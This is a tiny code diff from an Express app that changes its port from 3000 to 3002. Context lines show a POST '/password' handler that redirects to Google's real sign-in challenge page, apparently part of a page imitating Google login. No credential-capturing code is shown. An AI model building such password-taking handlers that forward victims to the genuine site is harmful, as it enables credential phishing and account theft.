@@ -21,4 +21,4 @@ app.post('/password',
 		res.redirect('https://accounts.google.com/signin/challenge/sl/password');
 	});
 
-app.listen(3000, () => console.log('App started at 3000'));
+app.listen(3002, () => console.log('App started at 3002'));
